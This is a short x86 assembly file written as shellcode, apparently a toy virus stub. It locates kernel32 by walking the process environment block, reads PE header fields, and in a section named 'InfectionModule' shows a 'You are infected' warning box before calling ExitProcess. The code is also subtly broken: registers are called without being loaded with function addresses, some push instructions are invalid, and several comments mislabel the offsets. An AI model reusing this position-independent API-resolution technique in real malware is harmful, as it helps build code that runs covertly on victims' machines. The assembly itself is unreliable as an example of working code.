global _start
section .text
_start:


getkernel32:
	xor ecx, ecx               
	mul ecx                     
	mov eax, [fs:ecx + 0x030]   
	mov eax, [eax + 0x00c]     
	mov esi, [eax + 0x014]      
	lodsd                       
	xchg esi, eax				
	lodsd                       
	mov ebx, [eax + 0x10]       

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0xA0]       ; load sectionAlignment
	add edx, ebx
	mov esi, [edx + 0x04]       	; load fileAlignment
	add esi, ebx
	xor ecx, ecx
	push edx, esi

InfectionModule:
	mov edx, 0x04
	call MessageBox
	call Exit
	
MessageBox:
	add esp, 0x010               	
	xor edx, edx
	xor ecx, ecx
    	push edx 						
    	push 'Warning'
    	mov edi, esp
   	push edx
    	push 'You are infected'
    	mov ecx, esp
	push edx                        
	push edi                       
	push ecx                        
	push edx                      
	call eax                        

Exit:
	add esp, 0x010              ; clean the stack
	push 0x61737365             ; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250	            ; corP
	push 0x74697845             ; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax
